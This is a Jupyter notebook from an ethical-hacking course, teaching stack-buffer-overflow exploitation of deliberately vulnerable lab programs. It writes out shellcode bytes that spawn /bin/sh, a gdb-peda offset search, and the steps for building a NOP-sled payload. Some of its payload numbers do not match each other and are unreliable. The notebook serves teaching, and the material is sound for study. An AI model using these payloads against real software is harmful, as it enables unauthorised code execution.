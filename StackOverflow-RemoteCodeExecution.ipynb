{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stack Overflow - Remote Code Execution\n",
    "\n",
    "- instead of sending junk and executing the existing code, send your own code and execute it!\n",
    "- for this technique to succeed, program's stack must be executable (not just read and write)\n",
    "- let's define some terminologies\n",
    "\n",
    "### Payload\n",
    "- a buffer that contains code and data to exploit the vulnerability\n",
    "- payload typically has the following structure:\n",
    "\n",
    "```bash\n",
    "| repeated nop sled | shellcode | repeated controlled return address |\n",
    "```\n",
    "- offset determines the length of the payload\n",
    "- shellcode size is fixed depending on what the code is supposed to do\n",
    "- usually room to play with the length of nop sled and controlled return address\n",
    "\n",
    "### nop sled\n",
    "- `\\x90` - no operation instruction in assembly\n",
    "- if the buffer is large enough, use good number of NOP as a bigger cushion/wider landing zone\n",
    "- as the stack may shift a bit, it's harder to land exactly where the shellcode is\n",
    "- NOP let's you slide right to your shellcode that spawns a shell/terminal\n",
    "- you still need to pad the controlled buffer to make it long enough to overwrite the caller's return address\n",
    "    \n",
    "### shellcode\n",
    "- shellcode is attacker's code that can do anything \n",
    "    - such as creating/deleting a log file, adding a new user, change filewall rule, etc.\n",
    "- binary code that actually exploits the vulnerability\n",
    "- most common shellcode typically spawns, local or remote, tcp connect, reverse connect shell/terminal\n",
    "- let's you own the system by giving you access to the terminal\n",
    "- Shellcodes database - [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)\n",
    "  \n",
    "### repeated return address\n",
    "- address pointing to some address of repeated nop sled  where it is stored in buffer variable\n",
    "- this controlled return address should overwrite the caller's return address on stack\n",
    "\n",
    "\n",
    "### Example program that spawns shell/terminal\n",
    "- let's look at an example program that spawns shell/terminal on the system by calling system call\n",
    "- `shellcode/system_shell.cpp` program uses system function defined in `<stdlib.h>` library to exectue `/bin/sh` command"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdlib>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "int main(int argc, char* argv[]) {\r\n",
      "    // simply call the system command\r\n",
      "    system(\"/bin/sh\");\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat shellcode/system_shell.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "input=\"shellcode/system_shell.cpp\"\n",
    "output=system_shell.exe\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- run system_shell.exe from terminal\n",
    "    - Jupyter notebook doesn't give shell/terminal\n",
    "\n",
    "```\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ ./system_shell.exe\n",
    "$ whoami\n",
    "kali\n",
    "$ date\n",
    "Wed 16 Dec 2020 10:37:24 PM MST\n",
    "$ exit\n",
    "```\n",
    "    \n",
    "- note that shellcode:\n",
    "    - typically is NOT bash command string by itself - /bin/sh\n",
    "    - is executable binary when executed gives shell/terminal\n",
    "    - typically written in C/assembly and compiled/assembled as a binary\n",
    "    - if stored in stack as a part of buffer, stack must be Executable!\n",
    "        - so the buffer can be treated as executable code\n",
    "        \n",
    "        \n",
    "## Remote code execution demos\n",
    "- make stack executable\n",
    "- use stack variable to store the remote shellcode\n",
    "- find the location of the shellcode and execute it\n",
    "\n",
    "### Use program argument to smuggle shellcode\n",
    "- if the vulnerable program uses argument to get the data, provide shellcode instead of data!\n",
    "- let's demonstrate it with `demos/stack_overflow/so_arg.cpp` program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdio>\r\n",
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "#define BUFSIZE 128\r\n",
      "\r\n",
      "void copydata(char *dst_buf, char *src_buf) {\r\n",
      "    // similar to strcpy in cstdio\r\n",
      "    size_t i = 0;\r\n",
      "    // copy each character from src_buf to des_buffer\r\n",
      "    // stop when NUL character is encountered\r\n",
      "    while (*(src_buf+i) != 0) {\r\n",
      "        *(dst_buf+i) = *(src_buf+i);\r\n",
      "        i++;\r\n",
      "    }\r\n",
      "    *(dst_buf+i) = 0; // end with NUL character\r\n",
      "}\r\n",
      "\r\n",
      "void bad(char *data) {\r\n",
      "    char buffer[BUFSIZE];\r\n",
      "    printf(\"buffer is at %p\\n\", buffer);\r\n",
      "    //strcpy(buffer, data);\r\n",
      "    copydata(buffer, data);\r\n",
      "    cout << \"buffer contains: \\n\" << buffer << endl;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    bad(argv[1]);\r\n",
      "    cout << \"Good bye!\" << endl;\r\n",
      "    return 0;\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "# let's look at the source\n",
    "# program simply copies and prints the user provided argument\n",
    "! cat demos/stack_overflow/so_arg.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# let's compile and execute the program\n",
    "input=\"demos/stack_overflow/so_arg.cpp\"\n",
    "output=so_arg.exe\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### crash the program\n",
    "- provide a large string and see how the program behaves\n",
    "- if the program crashes, availability of the program is violated and is the telltale sign that the program is likeley vulnerabile to stackoverflow!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc270\r\n",
      "buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! ./so_arg.exe $(python3 -c 'print(\"A\"*100)')\n",
    "# note the buffer address!\n",
    "# How do you know the program has crashed? \n",
    "# On terminal you'll see segfault!\n",
    "# On Jupyter notebook it's not obvious..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc250\r\n",
      "buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "# provide a longer argument and see if the program segfaults\n",
    "! ./so_arg.exe $(python3 -c 'print(\"A\"*128)')\n",
    "# also note the buffer address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffc240\r\n",
      "buffer contains: \r\n",
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
     ]
    }
   ],
   "source": [
    "# provide a longer argument and see if the program segfaults\n",
    "! ./so_arg.exe $(python3 -c 'print(\"A\"*140)')\n",
    "# buffer size is 128; 124 As crashes the program; notice no Good bye! printed\n",
    "# also note the buffer address"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- let's verify it on from the terminal that the program actually crashed\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ ./so_arg.exe $(python3 -c 'print(\"A\"*140)')\n",
    "buffer is at 0xffffc2d0\n",
    "buffer contains: \n",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n",
    "zsh: segmentation fault  ./so_arg.exe $(python3 -c 'print(\"A\"*140)')\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Remote code exection steps\n",
    "\n",
    "1. find the offset using gdb-peda\n",
    "2. generate shellcode using tools (peda, pwntools) or find the right shellcode at [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)\n",
    "3. find the return address of buffer or nop sled\n",
    "4. create payload and send it to the target program appropriately\n",
    "\n",
    "### Exploiting using bash and gdb-peda\n",
    "\n",
    "- find the offset using gdb-peda\n",
    "- we'll find the offset that overwrites the caller's return address\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ gdb -q so_arg.exe         \n",
    "Reading symbols from so_arg.exe...\n",
    "```\n",
    "\n",
    "- create cyclic pattern (long enough) 200 bytes as an argument and use it to run the program\n",
    "\n",
    "```bash\n",
    "gdb-peda$ pattern arg 200\n",
    "Set 1 arguments to program\n",
    "\n",
    "gdb-peda$ run\n",
    "\n",
    "Starting program: /home/kali/EthicalHacking/so_arg.exe 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'\n",
    "buffer is at 0xffffc250\n",
    "buffer contains: \n",
    "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0xf7fb2c00 --> 0xf7faf990 --> 0xf7ef71b0 (<_ZNSoD1Ev>:     push   ebx)\n",
    "EBX: 0x6c414150 ('PAAl')\n",
    "ECX: 0x6c0 \n",
    "EDX: 0x8051bb0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\"...)\n",
    "ESI: 0xf7de6000 --> 0x1e4d6c \n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0x41514141 ('AAQA')\n",
    "ESP: 0xffffc2e0 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "EIP: 0x41416d41 ('AmAA')\n",
    "EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "Invalid $PC address: 0x41416d41\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc2e0 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0004| 0xffffc2e4 (\"AASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0008| 0xffffc2e8 (\"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0012| 0xffffc2ec (\"TAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0016| 0xffffc2f0 (\"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0020| 0xffffc2f4 (\"ArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0024| 0xffffc2f8 (\"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "0028| 0xffffc2fc (\"AAWAAuAAXAAvAAYAAwAAZAAxAAyA\")\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x41416d41 in ?? ()\n",
    "```\n",
    "\n",
    "```bash\n",
    "\n",
    "gdb-peda$ patts\n",
    "Registers contain pattern buffer:\n",
    "EBX+0 found at offset: 132\n",
    "EBP+0 found at offset: 136\n",
    "EIP+0 found at offset: 140 <---- !!!THIS IS THE OFFSET!!!\n",
    "Registers point to pattern buffer:\n",
    "[EDX] --> offset 0 - size ~203\n",
    "[ESP] --> offset 144 - size ~56 \n",
    "Pattern buffer found at:\n",
    "0x08051bb0 : offset    0 - size  200 ([heap])\n",
    "0xf7c000cd : offset 33208 - size    4 (/usr/lib32/libm-2.31.so)\n",
    "0xffffc250 : offset    0 - size  200 ($sp + -0x90 [-36 dwords])\n",
    "0xffffc625 : offset    0 - size  200 ($sp + 0x345 [209 dwords])\n",
    "References to pattern buffer found at:\n",
    "0xf7de6d24 : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6d28 : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6d2c : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6d30 : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6d34 : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6d38 : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xf7de6d3c : 0x08051bb0 (/usr/lib32/libc-2.31.so)\n",
    "0xffffbbc4 : 0x08051bb0 ($sp + -0x71c [-455 dwords])\n",
    "0xffffbbe8 : 0x08051bb0 ($sp + -0x6f8 [-446 dwords])\n",
    "0xffffbc14 : 0x08051bb0 ($sp + -0x6cc [-435 dwords])\n",
    "0xffffbc30 : 0x08051bb0 ($sp + -0x6b0 [-428 dwords])\n",
    "0xffffbc34 : 0x08051bb0 ($sp + -0x6ac [-427 dwords])\n",
    "0xffffbc44 : 0x08051bb0 ($sp + -0x69c [-423 dwords])\n",
    "0xffffbc94 : 0x08051bb0 ($sp + -0x64c [-403 dwords])\n",
    "0xffffc0d8 : 0x08051bb0 ($sp + -0x208 [-130 dwords])\n",
    "0xffffc124 : 0x08051bb0 ($sp + -0x1bc [-111 dwords])\n",
    "0xf7e62dcc : 0xffffc250 (/usr/lib32/libstdc++.so.6.0.28)\n",
    "0xffffbd40 : 0xffffc250 ($sp + -0x5a0 [-360 dwords])\n",
    "0xf7e650b7 : 0xffffc625 (/usr/lib32/libstdc++.so.6.0.28)\n",
    "0xffffc3b8 : 0xffffc625 ($sp + 0xd8 [54 dwords])\n",
    "\n",
    "```\n",
    "\n",
    "- buffer address is conviniently printed everytime program is executed\n",
    "\n",
    "```bash\n",
    "\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ ./so_arg.exe $(python3 -c 'print(\"A\"*10)')                                                                 139 ⨯\n",
    "buffer is at 0xffffc360   <--------- buffer address; will this shift as the argument length changes?\n",
    "buffer contains: \n",
    "AAAAAAAAAA\n",
    "Good bye!\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### need shellcode\n",
    "\n",
    "- next we need a **shellcode**\n",
    "- a bunch of binary shellcode files are already provided in `shellcode` folder"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 20\r\n",
      "-rw-r--r-- 1 kali kali  24 Dec 16  2020 shellcode.bin\r\n",
      "-rw-r--r-- 1 kali kali  35 Dec 16  2020 shellcode_root.bin\r\n",
      "-rw-r--r-- 1 kali kali 978 Mar 17 23:01 shellcode_writer.py\r\n",
      "-rw-r--r-- 1 kali kali 153 Dec 16  2020 system_shell.cpp\r\n",
      "-rw-r--r-- 1 kali kali 364 Dec 16  2020 x86-linux-sh.py\r\n"
     ]
    }
   ],
   "source": [
    "! ls -l ./shellcode/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### generate shellcode with GDB-PEDA\n",
    "\n",
    "- PEDA provides several shellcodes to pick from\n",
    "- the following command generates linux/x86 local shellcode\n",
    "\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ gdb -q    \n",
    "gdb-peda$ shellcode generate\n",
    "Available shellcodes:\n",
    "    x86/linux exec\n",
    "    x86/linux bindport\n",
    "    x86/linux connect\n",
    "    x86/bsd exec\n",
    "    x86/bsd bindport\n",
    "    x86/bsd connect\n",
    "\n",
    "gdb-peda$ shellcode generate x86/linux exec\n",
    "# x86/linux/exec: 24 bytes\n",
    "shellcode = (\n",
    "    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\"\n",
    "    \"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\"\n",
    ")\n",
    "\n",
    "```\n",
    "- your can write the generated shellcode to a file for easy access\n",
    "- copy line by line hex values between \" \" and append it to a binary file\n",
    "- you can bash echo, or python3\n",
    "- the followin code demonstrates writing shellcode to a file using echo command"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# -n : do not print the trailing newline\n",
    "# -e : enable intrepretation of blackslash\n",
    "! echo -ne \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\" > shellcode_bash.bin\n",
    "! echo -ne \"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\" >> shellcode_bash.bin\n",
    "! echo -ne \"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\" >> shellcode_bash.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "24 shellcode_bash.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c shellcode_bash.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 31  |1.Ph//shh/bin..1|\r\n",
      "00000010  c9 89 ca 6a 0b 58 cd 80                           |...j.X..|\r\n",
      "00000018\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C shellcode_bash.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- the following Pyton3 script to write the shellcode to a binary file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Python3 script\n",
    "with open('shellcode_py3.bin', 'wb') as fout:\n",
    "    fout.write(b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\")\n",
    "    fout.write(b\"\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "24 shellcode_py3.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c shellcode_py3.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 31  |1.Ph//shh/bin..1|\r\n",
      "00000010  c9 89 ca 6a 0b 58 cd 80                           |...j.X..|\r\n",
      "00000018\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C shellcode_py3.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- the following command shows using Python3 from terminal to write the shellcode to a binary file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Python3 from terminal\n",
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x89\\xca\\x6a\\x0b\\x58\\xcd\\x80\")' > shellcode1_py3.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "24 shellcode1_py3.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c shellcode1_py3.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 31  |1.Ph//shh/bin..1|\r\n",
      "00000010  c9 89 ca 6a 0b 58 cd 80                           |...j.X..|\r\n",
      "00000018\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C shellcode1_py3.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### create payload\n",
    "\n",
    "- recall payload has the following structure\n",
    "```\n",
    "| NOP sled | shellcode | controlled return address |\n",
    "```\n",
    "\n",
    "- we found out that **144** is the total length of the payload as **140** is the offset\n",
    "- user shellcode (see above) is **24** bytes long\n",
    "- total bytes remaining for NOP sled and repeated return address can be calculated as following"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "120\n"
     ]
    }
   ],
   "source": [
    "print(144-24)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- out of **120** bytes, return address size is 4 in 32-bit system\n",
    "- let's repeat the return address *5 times*\n",
    "- so the size of repeated return address = **5\\*4 = 20**\n",
    "- that leaves us with **120 - 20 = 100 NOP sled**\n",
    "- **make sure length of (NOP sled + Shellcode) is a multiple of 4!**\n",
    "    - so the one of the 4-byte repeated return addresses perfectly aligns at the (EBP+4) location"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- so, we'll create the payload file of the following structure\n",
    "\n",
    "```\n",
    "| 100 NOP sled | 24 bytes shellcode | 5 controlled return addresses |\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's create NOP sled of 100 bytes long and write it to payload.bin file\n",
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*100)' > payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's append shellcode_py3.bin to payload.bin file\n",
    "! cat shellcode_py3.bin >> payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "124 payload.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c payload.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- what's the address of buffer?\n",
    "- make sure we use the same size of junk as the size of the payload\n",
    "- this should be run directly from terminal as the buffer will shift if the program is run from the notebook\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ ./so_arg.exe $(python3 -c 'print(\"A\"*144, end=\"\")')       <-- make sure to pass 144 bytes !!                                                  \n",
    "buffer is at 0xffffc2d0 <---- accurate buffer address we need\n",
    "buffer contains: \n",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n",
    "zsh: segmentation fault  ./so_arg.exe $(python3 -c 'print(\"A\"*144, end=\"\")')\n",
    "```\n",
    "\n",
    "- you can try landing at the base address of buffer or some bytes away from it, just in case!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ffffc2e4"
     ]
    }
   ],
   "source": [
    "# it's recommended to pick about 20 bytes away from the base address of the buffer \n",
    "# if possible and necessary\n",
    "! printf \"%x\" $((0xffffc2d0+20))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [],
   "source": [
    "# but, let's just use the buffer's base address to start with...\n",
    "# we repeat the return address 5 times\n",
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\xd0\\xcd\\xff\\xff\"*5)' >> payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "164 payload.bin\r\n"
     ]
    }
   ],
   "source": [
    "# out payload is ready; let's check size make sure it's the same as the offset\n",
    "! wc -c payload.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|\r\n",
      "*\r\n",
      "00000060  90 90 90 90 31 c0 50 68  2f 2f 73 68 68 2f 62 69  |....1.Ph//shh/bi|\r\n",
      "00000070  6e 89 e3 31 c9 89 ca 6a  0b 58 cd 80 e0 c1 ff ff  |n..1...j.X......|\r\n",
      "00000080  e0 c1 ff ff e0 c1 ff ff  e0 c1 ff ff e0 c1 ff ff  |................|\r\n",
      "00000090  d0 cd ff ff d0 cd ff ff  d0 cd ff ff d0 cd ff ff  |................|\r\n",
      "000000a0  d0 cd ff ff                                       |....|\r\n",
      "000000a4\r\n"
     ]
    }
   ],
   "source": [
    "# let's see the content using hexdump\n",
    "! hexdump -C payload.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### finally, run the target program with the payload \n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ ./so_arg.exe $(cat payload.bin)                                                                            \n",
    "buffer is at 0xffffc2d0\n",
    "buffer contains: \n",
    "����������������������������������������������������������������������������������������������������1�Ph//shh/bin��1ɉ�j\n",
    "  X��������������������\n",
    "$ whoami\n",
    "kali\n",
    "$ date\n",
    "Wed Dec 16 23:32:08 MST 2020\n",
    "$ exit\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Use standard input to smuggle the shellcode\n",
    "\n",
    "- if the program takes data from standard input and the buffer overrun is possible, then shellcode can still be transmitted and the program exploited\n",
    "- the steps are slightly different from sending shellcode as an argument\n",
    "- let's work with `so_stdio.cpp` program to demonstrate the steps"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <string.h>\r\n",
      "#include <sys/types.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <unistd.h>\r\n",
      "#include <iostream>\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "#define BUFSIZE 128\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "void give_shell(){\r\n",
      "    // Set the gid to the effective gid\r\n",
      "    // this prevents /bin/sh from dropping the privileges\r\n",
      "    gid_t gid = getegid();\r\n",
      "    setresgid(gid, gid, gid);\r\n",
      "    system(\"/bin/sh\");\r\n",
      "}\r\n",
      "\r\n",
      "char * mgets(char *dst) {\r\n",
      "    char *ptr = dst;\r\n",
      "    int ch; \r\n",
      "\t/* skip leading white spaces */ \r\n",
      "    while ((ch = getchar()) && (ch == ' ' or ch == '\\t') )\r\n",
      "        ; \r\n",
      "\r\n",
      "    if ((ch == '\\n') or (ch == EOF)) { \r\n",
      "        *ptr = '\\0';\r\n",
      "        return dst; \r\n",
      "    } \r\n",
      "    else\r\n",
      "        *ptr = ch;\r\n",
      "\r\n",
      "    /* now read the rest until \\n or EOF */ \r\n",
      "    while (true) {\r\n",
      "        ch = getchar();\r\n",
      "        if (ch == '\\n' or ch == EOF) break;\r\n",
      "        *(++ptr) = ch; \r\n",
      "    }\r\n",
      "    *(++ptr) = 0;\r\n",
      "    return dst;\r\n",
      "}\r\n",
      "\r\n",
      "void bad() {\r\n",
